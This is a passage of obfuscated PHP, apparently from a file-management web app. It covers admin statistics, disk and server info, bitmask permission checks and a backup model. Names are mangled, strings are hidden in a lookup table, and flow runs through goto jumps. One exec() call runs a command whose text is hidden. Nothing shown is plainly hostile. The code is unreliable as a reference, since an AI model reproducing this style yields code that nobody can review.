LNG($E‘™™ëŠ‹ä[1643]), $E‘™™ëŠ‹ä[1627] => LNG($E‘™™ëŠ‹ä[1644])), $E‘™™ëŠ‹ä[1628] => array($E‘™™ëŠ‹ä[739] => LNG($E‘™™ëŠ‹ä[1645]), $E‘™™ëŠ‹ä[1630] => LNG($E‘™™ëŠ‹ä[1646]), $E‘™™ëŠ‹ä[1631] => LNG($E‘™™ëŠ‹ä[1647]), $E‘™™ëŠ‹ä[1632] => LNG($E‘™™ëŠ‹ä[1648]))); $EÙ¹°ˆ°Î¤ = array($E‘™™ëŠ‹ä[571] => $E‘™™ëŠ‹ä[1649], $E‘™™ëŠ‹ä[1628] => $E‘™™ëŠ‹ä[78]); goto fáö¸Œò¨; fĞÒÌ´ôÄË: } public function validDate($eµö®ÕãÅè, $B¢ƒ…Ãœ­‚) { goto C†»˜†¸; C¢ô°ø£Œ©: switch ($eµö®ÕãÅè) { case $aå¡‰Àî¢[1516]: $F½Ğ‚ë¥÷ = mktime(0, 0, 0, date($aå¡‰Àî¢[1650]), date($aå¡‰Àî¢[1260]) - date($aå¡‰Àî¢[1322]) + 7 - 7, date($aå¡‰Àî¢[1651])); $b¶Ô¾ˆ‡³‚ = 0; do { $BÙŸÂáƒ×Ğ = date($aå¡‰Àî¢[1633], $F½Ğ‚ë¥÷ - 3600 * 24 * 7 * $b¶Ô¾ˆ‡³‚); $D¢…  ¦[] = $BÙŸÂáƒ×Ğ; $b¶Ô¾ˆ‡³‚++; } while ($B¢ƒ…Ãœ­‚ < $BÙŸÂáƒ×Ğ); break; case $aå¡‰Àî¢[1514]: $b¶Ô¾ˆ‡³‚ = 1; do { $Få¬ö¥ÕÈ = date($aå¡‰Àî¢[1652], strtotime("\x2d\x20{$b¶Ô¾ˆ‡³‚}\x20\x6d\157\x6e\x74\150\163")); $D¢…  ¦[] = $Få¬ö¥ÕÈ; $b¶Ô¾ˆ‡³‚++; } while ($B¢ƒ…Ãœ­‚ < $Få¬ö¥ÕÈ); break; case $aå¡‰Àî¢[1653]: $a¾ô¨®°õ£ = (int) date($aå¡‰Àî¢[1651], strtotime($B¢ƒ…Ãœ­‚)); $dà«ÄÇİ = (int) date($aå¡‰Àî¢[1651]); if ($a¾ô¨®°õ£ >= $dà«ÄÇİ) { break; } for ($a¾ô¨®°õ£; $a¾ô¨®°õ£ < $dà«ÄÇİ; $a¾ô¨®°õ£++) { $D¢…  ¦[] = $a¾ô¨®°õ£ . $aå¡‰Àî¢[1654]; } break; default: break; } if ($B¢ƒ…Ãœ­‚ > end($D¢…  ¦)) { array_pop($D¢…  ¦); } sort($D¢…  ¦); goto c•Ó¯©Àé½; c•Ó¯©Àé½: return $D¢…  ¦; goto F‰‘è«·Ğ‘; C†»˜†¸: $aå¡‰Àî¢ =& $_SERVER[úÉ·öƒÑì©]; $C·Å”ª²£ = date($aå¡‰Àî¢[1633], strtotime($aå¡‰Àî¢[1634])); $D¢…  ¦ = array($C·Å”ª²£); goto C¢ô°ø£Œ©; F‰‘è«·Ğ‘: } public function listTable($dĞ è¡ªé ) { $F¬í¬ØÊÇê = ucfirst($dĞ è¡ªé ); return Model($F¬í¬ØÊÇê)->listData(); } public function option($b—µÇ±¯‚) { $Cåë“‹šèè = $_SERVER[úÉ·öƒÑì©][1655] . ucfirst($b—µÇ±¯‚); return $this->{$Cåë“‹šèè}(); } private function optionUser() { goto e†ïÒøÑØ; eƒ®††æ°°: return array($a´Ó¸˜Éğ[735] => (int) $C¾µâ’ì™‰, $a´Ó¸˜Éğ[1658] => (int) ($C¾µâ’ì™‰ - $bİäŒœ°™‚), $a´Ó¸˜Éğ[1659] => (int) $bİäŒœ°™‚, $a´Ó¸˜Éğ[1660] => (int) $c‚çà¢èš, $a´Ó¸˜Éğ[1661] => $F…ÄÚ£µù•); goto F‘ß‡§ŠÉ†; fôËèŠˆ­µ: if (!$F…ÄÚ£µù•) { $F…ÄÚ£µù• = 1; } $Bß¾ÃùÉğÙ = array($a´Ó¸˜Éğ[1657] => array($a´Ó¸˜Éğ[979], $ağÍ’™‹ ó)); $c‚çà¢èš = Model($a´Ó¸˜Éğ[515])->where($Bß¾ÃùÉğÙ)->count($a´Ó¸˜Éğ[1535]); goto eƒ®††æ°°; Bˆ®•ƒ¼Œ: if ($A˜¹¾” íö < $ağÍ’™‹ ó) { $A˜¹¾” íö = $ağÍ’™‹ ó; } $Bß¾ÃùÉğÙ = array($a´Ó¸˜Éğ[1657] => array($a´Ó¸˜Éğ[979], $A˜¹¾” íö)); $F…ÄÚ£µù• = (int) Model($a´Ó¸˜Éğ[515])->where($Bß¾ÃùÉğÙ)->count($a´Ó¸˜Éğ[1535]); goto fôËèŠˆ­µ; cî¬ ³¼²³: $a‡ïĞ”ÇŠá = intval($GLOBALS[$a´Ó¸˜Éğ[6]][$a´Ó¸˜Éğ[356]][$a´Ó¸˜Éğ[1495]]) / 3600; $A˜¹¾” íö = strtotime("\55{$a‡ïĞ”ÇŠá}\x20\x68\x6f\165\x72\x73"); $ağÍ’™‹ ó = strtotime(date($a´Ó¸˜Éğ[1637])); goto Bˆ®•ƒ¼Œ; e†ïÒøÑØ: $a´Ó¸˜Éğ =& $_SERVER[úÉ·öƒÑì©]; $C¾µâ’ì™‰ = Model($a´Ó¸˜Éğ[515])->count($a´Ó¸˜Éğ[1535]); $bİäŒœ°™‚ = Model($a´Ó¸˜Éğ[515])->where($a´Ó¸˜Éğ[1656])->count($a´Ó¸˜Éğ[1535]); goto cî¬ ³¼²³; F‘ß‡§ŠÉ†: } private function optionFile() { goto f“ö †Œ¼²; f“ö †Œ¼²: $E‘‹Ğ˜ÒÆ´ =& $_SERVER[úÉ·öƒÑì©]; $aŸ´Øï¢—Ò = $this->sourceSize(); $F¤³‹…õï¿ = $aŸ´Øï¢—Ò[$E‘‹Ğ˜ÒÆ´[78]]; goto eí§³–áŒç; FÚåˆ¾ë¶: $CÇ†áÁ´ø = Model($E‘‹Ğ˜ÒÆ´[806])->where($C«ÒÙ‹ùß‹)->sum($E‘‹Ğ˜ÒÆ´[78]); $BƒèšÏË„§ = Model($E‘‹Ğ˜ÒÆ´[806])->where($C«ÒÙ‹ùß‹)->count($E‘‹Ğ˜ÒÆ´[404]); return array($E‘‹Ğ˜ÒÆ´[739] => $F¤³‹…õï¿, $E‘‹Ğ˜ÒÆ´[1630] => $b›‚±—¬¼‰, $E‘‹Ğ˜ÒÆ´[1662] => $F¤³‹…õï¿ - $b›‚±—¬¼‰, $E‘‹Ğ˜ÒÆ´[1663] => (int) $CÇ†áÁ´ø, $E‘‹Ğ˜ÒÆ´[741] => (int) $fø¾—î‰è¶, $E‘‹Ğ˜ÒÆ´[1664] => (int) $BƒèšÏË„§); goto fõ£˜²–; eí§³–áŒç: $b›‚±—¬¼‰ = $aŸ´Øï¢—Ò[$E‘‹Ğ˜ÒÆ´[1630]]; $fø¾—î‰è¶ = Model($E‘‹Ğ˜ÒÆ´[806])->where(array($E‘‹Ğ˜ÒÆ´[412] => 0))->count($E‘‹Ğ˜ÒÆ´[404]); $C«ÒÙ‹ùß‹ = array($E‘‹Ğ˜ÒÆ´[412] => 0, $E‘‹Ğ˜ÒÆ´[194] => array($E‘‹Ğ˜ÒÆ´[979], strtotime(date($E‘‹Ğ˜ÒÆ´[1637])))); goto FÚåˆ¾ë¶; fõ£˜²–: } private function optionAccess() { $bğ¾ã‰Å‚ =& $_SERVER[úÉ·öƒÑì©]; return array($bğ¾ã‰Å‚[735] => $this->typeLogCnt(), $bğ¾ã‰Å‚[107] => $this->typeLogCnt($bğ¾ã‰Å‚[107]), $bğ¾ã‰Å‚[439] => $this->typeLogCnt($bğ¾ã‰Å‚[439]), $bğ¾ã‰Å‚[1665] => $this->typeLogCnt($bğ¾ã‰Å‚[1665]), $bğ¾ã‰Å‚[1666] => $this->typeLogCnt($bğ¾ã‰Å‚[1666]), $bğ¾ã‰Å‚[571] => $this->typeLogCnt($bğ¾ã‰Å‚[33], $bğ¾ã‰Å‚[1641])); } private function typeLogCnt($aİèÚÖòÂÊ = '', $D·¾óÕÍ™• = "\151\144") { goto E£‚á×Èœö; cµ¾±¾Òƒä: return (int) $b—… Ï‰˜Ó; goto cËáçªß¼À; E£‚á×Èœö: $c²Ò›‹¼Û =& $_SERVER[úÉ·öƒÑì©]; $FÆ»¡Ö¡†¥ = array($c²Ò›‹¼Û[107] => array($c²Ò›‹¼Û[1667], $c²Ò›‹¼Û[1668]), $c²Ò›‹¼Û[439] => array($c²Ò›‹¼Û[1669], $c²Ò›‹¼Û[1670]), $c²Ò›‹¼Û[1665] => array($c²Ò›‹¼Û[1671], $c²Ò›‹¼Û[1672], $c²Ò›‹¼Û[1673]), $c²Ò›‹¼Û[1666] => array($c²Ò›‹¼Û[1674], $c²Ò›‹¼Û[1675]), $c²Ò›‹¼Û[1676] => array($c²Ò›‹¼Û[1677], $c²Ò›‹¼Û[1678], $c²Ò›‹¼Û[1679])); $bÇÊ¨š¾›½ = strtotime(date($c²Ò›‹¼Û[1637])); goto C›ÏñĞ¯â¢; C›ÏñĞ¯â¢: $c“±ÔíÒï§ = array($c²Ò›‹¼Û[194] => array($c²Ò›‹¼Û[979], $bÇÊ¨š¾›½)); if ($aİèÚÖòÂÊ) { $c“±ÔíÒï§[$c²Ò›‹¼Û[29]] = array($c²Ò›‹¼Û[7], $FÆ»¡Ö¡†¥[$aİèÚÖòÂÊ]); } $b—… Ï‰˜Ó = Model($c²Ò›‹¼Û[1640])->where($c“±ÔíÒï§)->count($D·¾óÕÍ™•); goto cµ¾±¾Òƒä; cËáçªß¼À: } private function optionServer() { goto dœŒŒå×›; bæÉ¡Ï‡„Ë: return array($b™ÛÃ«ö[1682] => $FÄ—¯Ô°…³ ? $FÄ—¯Ô°…³[$b™ÛÃ«ö[1683]] : 0, $b™ÛÃ«ö[1684] => $FÄ—¯Ô°…³ ? $FÄ—¯Ô°…³[$b™ÛÃ«ö[1685]] : 0, $b™ÛÃ«ö[1686] => (int) $DÄ¬ËĞÕ[$b™ÛÃ«ö[1683]] * 1024 * 1024 * 1024, $b™ÛÃ«ö[1687] => (int) $fŠ˜ƒÛßŞ†, $b™ÛÃ«ö[1688] => ucfirst($Bù‘¡Ï¥Ö›), $b™ÛÃ«ö[1689] => $b™ÛÃ«ö[1690] . PHP_VERSION, $b™ÛÃ«ö[1691] => phpBuild64() ? 64 : 32, $b™ÛÃ«ö[734] => str_replace($b™ÛÃ«ö[1692], $b™ÛÃ«ö[956], $EôÛïİœ¸Ş), $b™ÛÃ«ö[356] => ucfirst($EÁÎëÃÏÚä), $b™ÛÃ«ö[28] => $_SERVER[$b™ÛÃ«ö[1693]]); goto aˆÎ•›ŠŠ„; AÌ­»îì: $Bù‘¡Ï¥Ö› = $bùµàÚÂ‚Ï[0]; $aĞóÎŒí»Ú = $GLOBALS[$b™ÛÃ«ö[6]][$b™ÛÃ«ö[17]]; $EôÛïİœ¸Ş = $aĞóÎŒí»Ú[$b™ÛÃ«ö[940]]; goto fí±‰Ç®·‹; dœŒŒå×›: $b™ÛÃ«ö =& $_SERVER[úÉ·öƒÑì©]; $FÄ—¯Ô°…³ = $this->diskDriver(); $DÄ¬ËĞÕ = KodIO::defaultDriver(); goto aŸ¨é¨¨Õ; fí±‰Ç®·‹: if ($EôÛïİœ¸Ş == $b™ÛÃ«ö[771]) { $D½ëŸÅ¦Œ‚ = explode($b™ÛÃ«ö[1174], $aĞóÎŒí»Ú[$b™ÛÃ«ö[939]]); $EôÛïİœ¸Ş = $D½ëŸÅ¦Œ‚[0]; } if ($EôÛïİœ¸Ş == $b™ÛÃ«ö[774] || $EôÛïİœ¸Ş == $b™ÛÃ«ö[775]) { $BÃÂÅ–Ş˜Ò = Model()->db()->query($b™ÛÃ«ö[1680]); $aÂ˜µ˜§©» = $BÃÂÅ–Ş˜Ò[0] && isset($BÃÂÅ–Ş˜Ò[0][$b™ÛÃ«ö[1440]]) ? $BÃÂÅ–Ş˜Ò[0][$b™ÛÃ«ö[1440]] : 0; $EôÛïİœ¸Ş = $b™ÛÃ«ö[1681] . ($aÂ˜µ˜§©» ? $b™ÛÃ«ö[8] . $aÂ˜µ˜§©» : $b™ÛÃ«ö[33]); } $EÁÎëÃÏÚä = $GLOBALS[$b™ÛÃ«ö[6]][$b™ÛÃ«ö[356]][$b™ÛÃ«ö[808]]; goto bæÉ¡Ï‡„Ë; aŸ¨é¨¨Õ: $Bğê­¶ƒÈ = array($b™ÛÃ«ö[798] => $DÄ¬ËĞÕ[$b™ÛÃ«ö[402]]); $fŠ˜ƒÛßŞ† = Model($b™ÛÃ«ö[459])->where($Bğê­¶ƒÈ)->sum($b™ÛÃ«ö[78]); $bùµàÚÂ‚Ï = explode($b™ÛÃ«ö[50], $_SERVER[$b™ÛÃ«ö[142]]); goto AÌ­»îì; aˆÎ•›ŠŠ„: } private function diskDriver() { goto cî‡¬»˜ò; Dº¡ñÅİ×¨: if ($AŞĞâôì²) { $aÙ¥»á„š† = $A³ØÈ…äæ[1696]; if (function_exists($A³ØÈ…äæ[1697])) { exec($A³ØÈ…äæ[1698], $CÎÒ÷ÑØäË); $aÙ¥»á„š† = $CÎÒ÷ÑØäË[1] . $A³ØÈ…äæ[8]; } } if (!file_exists($aÙ¥»á„š†)) { return; } $fÏ†™Ó‹İ = @disk_total_space($aÙ¥»á„š†); goto d¿ÅÂØ¼¤±; cî‡¬»˜ò: $A³ØÈ…äæ =& $_SERVER[úÉ·öƒÑì©]; $aÙ¥»á„š† = $A³ØÈ…äæ[8]; $AŞĞâôì² = $GLOBALS[$A³ØÈ…äæ[6]][$A³ØÈ…äæ[1694]] == $A³ØÈ…äæ[1695]; goto Dº¡ñÅİ×¨; d¿ÅÂØ¼¤±: $Eêİá­ª = $fÏ†™Ó‹İ - @disk_free_space($aÙ¥»á„š†); return array($A³ØÈ…äæ[1683] => $fÏ†™Ó‹İ, $A³ØÈ…äæ[1685] => $Eêİá­ª); goto bğßæãƒ™†; bğßæãƒ™†: } public function fileChart($DğñÅİÇõ“) { goto c¿ÊòÆàì; c¿ÊòÆàì: $dùŸ„µ¿×¦ =& $_SERVER[úÉ·öƒÑì©]; if (isset($DğñÅİÇõ“[$dùŸ„µ¿×¦[1535]])) { return Model($dùŸ„µ¿×¦[806])->userFileTypeProfile($DğñÅİÇõ“[$dùŸ„µ¿×¦[1535]]); } if (isset($DğñÅİÇõ“[$dùŸ„µ¿×¦[1699]])) { return Model($dùŸ„µ¿×¦[806])->groupFileTypeProfile($DğñÅİÇõ“[$dùŸ„µ¿×¦[1699]]); } goto f˜¬ËÇ‹Å; dï§ÄñæØª: $aÁ½İñìŒ[$dùŸ„µ¿×¦[413]] = 2; $f£ÁôÛÎø‘ = Model($dùŸ„µ¿×¦[806])->where($aÁ½İñìŒ)->sum($dùŸ„µ¿×¦[78]); return array($dùŸ„µ¿×¦[739] => $DÎˆùÍ°›í[$dùŸ„µ¿×¦[78]], $dùŸ„µ¿×¦[1630] => $DÎˆùÍ°›í[$dùŸ„µ¿×¦[1630]], $dùŸ„µ¿×¦[1631] => (int) $f•š•ŞĞÅ¥, $dùŸ„µ¿×¦[1632] => (int) $f£ÁôÛÎø‘); goto E£é ›øãà; f˜¬ËÇ‹Å: $DÎˆùÍ°›í = $this->sourceSize(); $aÁ½İñìŒ = array($dùŸ„µ¿×¦[487] => 0, $dùŸ„µ¿×¦[413] => 1); $f•š•ŞĞÅ¥ = Model($dùŸ„µ¿×¦[806])->where($aÁ½İñìŒ)->sum($dùŸ„µ¿×¦[78]); goto dï§ÄñæØª; E£é ›øãà: } private function sourceSize() { $A©òó—‡‡Á =& $_SERVER[úÉ·öƒÑì©]; $EŒ«×è˜Ø = Model($A©òó—‡‡Á[806])->where(array($A©òó—‡‡Á[412] => 0))->sum($A©òó—‡‡Á[78]); $CÆŞñ¤Âòæ = Model($A©òó—‡‡Á[459])->sum($A©òó—‡‡Á[78]); if ($CÆŞñ¤Âòæ > $EŒ«×è˜Ø) { $CÆŞñ¤Âòæ = $EŒ«×è˜Ø; } return array($A©òó—‡‡Á[78] => (int) $EŒ«×è˜Ø, $A©òó—‡‡Á[1630] => (int) $CÆŞñ¤Âòæ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $c®­¥”ö¾¢ =& $_SERVER[úÉ·öƒÑì©]; $C—¶³ø¯ãñ = array(array($c®­¥”ö¾¢[422] => LNG($c®­¥”ö¾¢[1700]), $c®­¥”ö¾¢[1701] => $c®­¥”ö¾¢[1702], $c®­¥”ö¾¢[1703] => 1, $c®­¥”ö¾¢[1704] => 1, $c®­¥”ö¾¢[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($c®­¥”ö¾¢[422] => LNG($c®­¥”ö¾¢[1706]), $c®­¥”ö¾¢[1701] => $c®­¥”ö¾¢[1707], $c®­¥”ö¾¢[1703] => 2, $c®­¥”ö¾¢[1704] => 1, $c®­¥”ö¾¢[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($c®­¥”ö¾¢[422] => LNG($c®­¥”ö¾¢[1708]), $c®­¥”ö¾¢[1701] => $c®­¥”ö¾¢[1709], $c®­¥”ö¾¢[1703] => 3, $c®­¥”ö¾¢[1704] => 1, $c®­¥”ö¾¢[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($c®­¥”ö¾¢[422] => LNG($c®­¥”ö¾¢[1710]), $c®­¥”ö¾¢[1701] => $c®­¥”ö¾¢[1711], $c®­¥”ö¾¢[1703] => 4, $c®­¥”ö¾¢[1704] => 1, $c®­¥”ö¾¢[1705] => self::AUTH_SHOW | self::AUTH_VIEW), array($c®­¥”ö¾¢[422] => LNG($c®­¥”ö¾¢[1712]), $c®­¥”ö¾¢[1701] => $c®­¥”ö¾¢[1713], $c®­¥”ö¾¢[1703] => 5, $c®­¥”ö¾¢[1704] => 1, $c®­¥”ö¾¢[1705] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($c®­¥”ö¾¢[422] => LNG($c®­¥”ö¾¢[1714]), $c®­¥”ö¾¢[1701] => $c®­¥”ö¾¢[1715], $c®­¥”ö¾¢[1703] => 6, $c®­¥”ö¾¢[1704] => 1, $c®­¥”ö¾¢[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($c®­¥”ö¾¢[422] => LNG($c®­¥”ö¾¢[1716]), $c®­¥”ö¾¢[1701] => $c®­¥”ö¾¢[1717], $c®­¥”ö¾¢[1703] => 7, $c®­¥”ö¾¢[1704] => 1, $c®­¥”ö¾¢[1705] => 0)); return $C—¶³ø¯ãñ; } public static function authCheck($F·´‹ââ, $EŒÂ¨ÏÁ’Ì) { $F·´‹ââ = intval($F·´‹ââ); if ($GLOBALS[$_SERVER[úÉ·öƒÑì©][494]]) { return !0; } if ($F·´‹ââ <= 0) { return !1; } if (($F·´‹ââ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($F·´‹ââ & $EŒÂ¨ÏÁ’Ì); } public static function authCheckShow($A¨±‚å¦”) { return self::authCheck($A¨±‚å¦”, self::AUTH_SHOW); } public static function authCheckView($F«„Üøšç) { return self::authCheck($F«„Üøšç, self::AUTH_VIEW); } public static function authCheckDownload($AÀ—©©Ä©À) { return self::authCheck($AÀ—©©Ä©À, self::AUTH_DOWNLOAD); } public static function authCheckUpload($CšŒªëõ“ñ) { return self::authCheck($CšŒªëõ“ñ, self::AUTH_UPLOAD); } public static function authCheckEdit($A‰äºõâ¬Ü) { return self::authCheck($A‰äºõâ¬Ü, self::AUTH_EDIT); } public static function authCheckRemove($bÔÅùÖ¹ñ«) { return self::authCheck($bÔÅùÖ¹ñ«, self::AUTH_REMOVE); } public static function authCheckShare($D‹½æÜ«) { return self::authCheck($D‹½æÜ«, self::AUTH_SHARE); } public static function authCheckComment($a¼†ï°‚¸Í) { return self::authCheck($a¼†ï°‚¸Í, self::AUTH_COMMENT); } public static function authCheckEvent($d“Õ³Øó³×) { return self::authCheck($d“Õ³Øó³×, self::AUTH_EVENT); } public static function authCheckRoot($A„Ñõ›ç) { return self::authCheck($A„Ñõ›ç, self::AUTH_ROOT); } public static function authCheckAction($Bõ¹É»Ñ‘Î, $F¸½­¸²«‘) { goto aŞÑÙ©ñÈ; aŞÑÙ©ñÈ: $CÏº–ÏÚ =& $_SERVER[úÉ·öƒÑì©]; $A“É êÇµƒ = array($CÏº–ÏÚ[1718] => self::AUTH_VIEW, $CÏº–ÏÚ[1102] => self::AUTH_DOWNLOAD, $CÏº–ÏÚ[107] => self::AUTH_UPLOAD, $CÏº–ÏÚ[1666] => self::AUTH_EDIT, $CÏº–ÏÚ[1665] => self::AUTH_REMOVE, $CÏº–ÏÚ[1676] => self::AUTH_SHARE, $CÏº–ÏÚ[361] => self::AUTH_COMMENT, $CÏº–ÏÚ[1524] => self::AUTH_EVENT, $CÏº–ÏÚ[1719] => self::AUTH_ROOT); if (!isset($A“É êÇµƒ[$F¸½­¸²«‘])) { return; } goto BÌ’ß•Í”ï; BÌ’ß•Í”ï: $eÃ®÷–ï¨µ = $A“É êÇµƒ[$F¸½­¸²«‘]; $Bõ¹É»Ñ‘Î = intval($Bõ¹É»Ñ‘Î); if ($Bõ¹É»Ñ‘Î <= 0) { return !1; } goto eó©¾¶ŒÎ; eó©¾¶ŒÎ: if (($Bõ¹É»Ñ‘Î & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Bõ¹É»Ñ‘Î & $eÃ®÷–ï¨µ); goto AÓ–¤ÙŸØ; AÓ–¤ÙŸØ: } public static function authDisable($cÌäÓÛ—·, $Fòñ³Çºé™) { if (intval($cÌäÓÛ—·) <= 0) { return 0; } return intval($cÌäÓÛ—·) & ~$Fòñ³Çºé™; } public $optionType = "\123\x79\163\164\145\x6d\x2e\163\x6f\x75\x72\143\145\101\165\x74\x68\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\141\x75\164\x68", "\x6c\141\142\x65\x6c", "\144\151\x73\160\x6c\141\x79", "\163\171\163\164\145\x6d", "\163\157\x72\x74"); public function initData() { $E­Ìğä´’ = $this->authDefault(); foreach ($E­Ìğä´’ as $b İŒñÎ½‹) { $this->add($b İŒñÎ½‹); } } public function listData($dˆ·šåîÊ¸ = false, $e‚ë›¯­÷Í = "\163\157\x72\164", $cñ½Ø•¨è = false) { return parent::listData($dˆ·šåîÊ¸, $e‚ë›¯­÷Í, $cñ½Ø•¨è); } public function update($dâ„ÀÚâ‘’, $a¼Ã¶•») { $FÛã™ô…àæ =& $_SERVER[úÉ·öƒÑì©]; $D‰èè½±ò = parent::listData($dâ„ÀÚâ‘’); $fÓ‡àŸø÷ = $this->findByName($a¼Ã¶•»[$FÛã™ô…àæ[28]]); if (!$D‰èè½±ò || $fÓ‡àŸø÷ && $fÓ‡àŸø÷[$FÛã™ô…àæ[402]] != $D‰èè½±ò[$FÛã™ô…àæ[402]]) { return !1; } $this->filterAuth($a¼Ã¶•»[$FÛã™ô…àæ[415]]); return parent::update($dâ„ÀÚâ‘’, $a¼Ã¶•»); } public function remove($Cåñí‹¿ñ“) { $AŠà¨•ß = parent::listData($Cåñí‹¿ñ“); if (!$AŠà¨•ß || $AŠà¨•ß[$_SERVER[úÉ·öƒÑì©][1178]]) { return !1; } return parent::remove($Cåñí‹¿ñ“); } public function add($D…–ÕÉ‹ê¬ = array()) { goto eÎ¾ÀÈ±¢; CÄÇš†…³: $D…–ÕÉ‹ê¬ = array_merge($E®ğ×áÄ«, $D…–ÕÉ‹ê¬); $D…–ÕÉ‹ê¬[$f˜ƒ³œµÙ‚[1722]] = $this->getSort(); $this->filterAuth($D…–ÕÉ‹ê¬[$f˜ƒ³œµÙ‚[415]]); goto FàËÛ‹‡´¡; FàËÛ‹‡´¡: return parent::insert($D…–ÕÉ‹ê¬); goto dÃßÀº¾áÒ; eÎ¾ÀÈ±¢: $f˜ƒ³œµÙ‚ =& $_SERVER[úÉ·öƒÑì©]; if ($this->findByName($D…–ÕÉ‹ê¬[$f˜ƒ³œµÙ‚[28]])) { return !1; } $E®ğ×áÄ« = array($f˜ƒ³œµÙ‚[28] => $f˜ƒ³œµÙ‚[33], $f˜ƒ³œµÙ‚[415] => 1, $f˜ƒ³œµÙ‚[1720] => $f˜ƒ³œµÙ‚[1709], $f˜ƒ³œµÙ‚[1721] => 1, $f˜ƒ³œµÙ‚[1178] => 0, $f˜ƒ³œµÙ‚[1722] => 0); goto CÄÇš†…³; dÃßÀº¾áÒ: } private function getSort() { $a”˜ñ™Å‹” =& $_SERVER[úÉ·öƒÑì©]; $E˜ƒ‚Ğñ¬í = parent::listData(); $c‹Ò²²“¶Å = array_to_keyvalue($E˜ƒ‚Ğñ¬í, $a”˜ñ™Å‹”[33], $a”˜ñ™Å‹”[1722]); return empty($c‹Ò²²“¶Å) ? 0 : max($c‹Ò²²“¶Å) + 1; } private function filterAuth(&$A¦µÎêÊ¢) { goto AñÜ“ ãŒÉ; AñÜ“ ãŒÉ: if (!$A¦µÎêÊ¢) { return; } $BÏË‚‚Šè¿ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $CĞ•ÊŠ‹‘× = array(); goto D…¡í×ºŸ‘; D…¡í×ºŸ‘: foreach ($BÏË‚‚Šè¿ as $aÆ¨Ú‡ÂŞÃ) { if ($A¦µÎêÊ¢ & $aÆ¨Ú‡ÂŞÃ) { $CĞ•ÊŠ‹‘×[] = $aÆ¨Ú‡ÂŞÃ; } } if (in_array(self::AUTH_ROOT, $CĞ•ÊŠ‹‘×)) { $A¦µÎêÊ¢ = array_sum($BÏË‚‚Šè¿); return; } $bè”ˆ™ÕÄæ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bË…©¢ŸÍ; bË…©¢ŸÍ: foreach ($CĞ•ÊŠ‹‘× as $aÆ¨Ú‡ÂŞÃ) { if (isset($bè”ˆ™ÕÄæ[$aÆ¨Ú‡ÂŞÃ])) { $CĞ•ÊŠ‹‘× = array_merge($CĞ•ÊŠ‹‘×, $bè”ˆ™ÕÄæ[$aÆ¨Ú‡ÂŞÃ]); } } $CĞ•ÊŠ‹‘×[] = self::AUTH_SHOW; $A¦µÎêÊ¢ = array_sum(array_unique($CĞ•ÊŠ‹‘×)); goto E²‰œ•¤; E²‰œ•¤: } public function sort($Aî®»–®—•, $C–í¼·ğ­ª) { return parent::update($Aî®»–®—•, $C–í¼·ğ­ª); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\142\x61\x63\x6b\165\160\114\x69\163\164"; public $field = array("\x69\x6f", "\x6e\x61\x6d\x65", "\x73\164\141\164\x75\163", "\x63\x6f\156\164\x65\156\164", "\x6d\141\x6e\165\x61\x6c", "\162\145\163\165\154\x74", "\x74\151\155\145\x46\x72\x6f\155", "\164\151\155\x65\x54\x6f"); public function config() { goto B‡ßÍêóÖÎ; B‡ßÍêóÖÎ: $Eğ¶ê ¶ˆ‹ =& $_SERVER[úÉ·öƒÑì©]; $D¾­“Î±ãŞ = Model($Eğ¶ê ¶ˆ‹[746])->get($Eğ¶ê ¶ˆ‹[758]); $D¾­“Î±ãŞ = json_decode($D¾­“Î±ãŞ, !0); goto a»ïãâÓà; Cß«ê¡ßŠ‘: Action($Eğ¶ê ¶ˆ‹[1723])->taskInit(); Model($Eğ¶ê ¶ˆ‹[1505])->cacheClear(); $aŞÆ–š‹ª = $Eğ¶ê ¶ˆ‹[1724]; goto FÑç¶Ì·š; Cë²ÃÑŒ¿: if (isset($D¾­“Î±ãŞ[$Eğ¶ê ¶ˆ‹[197]])) { $C™²øôÅï[$Eğ¶ê ¶ˆ‹[197]][$Eğ¶ê ¶ˆ‹[1509]] = $D¾­“Î±ãŞ[$Eğ¶ê ¶ˆ‹[197]]; unset($D¾­“Î±ãŞ[$Eğ¶ê ¶ˆ‹[197]]); } return array_merge($C™²øôÅï, $D¾­“Î±ãŞ); goto AÀÖğ«ê®õ; FÑç¶Ì·š: $C™²øôÅï = Model($Eğ¶ê ¶ˆ‹[1725])->findByKey($Eğ¶ê ¶ˆ‹[1524], $aŞÆ–š‹ª); if (!$C™²øôÅï) { $C™²øôÅï 